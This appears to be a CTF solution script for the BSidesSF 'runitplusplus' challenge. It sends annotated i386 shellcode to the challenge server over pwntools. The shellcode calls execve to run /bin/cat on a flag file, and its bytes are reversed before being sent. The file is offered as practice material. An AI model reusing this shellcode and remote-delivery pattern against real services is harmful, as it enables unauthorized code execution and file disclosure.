#! /usr/bin/python 

import binascii
import socket
import sys
import struct
import time
from pwn import *

FLAG_location = "/home/ctf/flag.txt"

TCP_IP  = "runitplusplus-a36bf652.challenges.bsidessf.net"
TCP_PORT = 5353

# Disassembly:
# 0:  31 c0                   xor    eax,eax
# 2:  99                      cdq
# 3:  52                      push   edx
# 4:  68 2f 63 61 74          push   0x7461632f # /bin/cat
# 9:  68 2f 62 69 6e          push   0x6e69622f
# e:  89 e3                   mov    ebx,esp
# 10: 52                      push   edx
# 11: 68 78 74 00 00          push   0x7478
# 16: 68 61 67 2e 74          push   0x742e6761
# 1b: 68 66 2f 66 6c          push   0x6c662f66
# 20: 68 65 2f 63 74          push   0x74632f65
# 25: 68 2f 68 6f 6d          push   0x6d6f682f
# 2a: 89 e1                   mov    ecx,esp
# 2c: b0 0b                   mov    al,0xb # sys_execve
# 2e: 52                      push   edx
# 2f: 51                      push   ecx
# 30: 53                      push   ebx
# 31: 89 e1                   mov    ecx,esp
# 33: cd 80                   int    0x80

payload = "\x31\xc0\x99\x52\x68\x2f\x63\x61"
payload += "\x74\x68\x2f\x62\x69\x6e\x89\xe3"
payload += "\x52\x68\x78\x74\x00\x00\x68\x61"
payload += "\x67\x2e\x74\x68\x66\x2f\x66\x6c"
payload += "\x68\x65\x2f\x63\x74\x68\x2f\x68"
payload += "\x6f\x6d\x89\xe1\xb0\x0b\x52\x51"
payload += "\x53\x89\xe1\xcd\x80\x0a"

payload = payload[::-1] # reverse it

context(arch = 'i386', os = 'linux')

r = remote(TCP_IP, TCP_PORT)

r.send(payload)
#r.send("\n")
r.interactive()
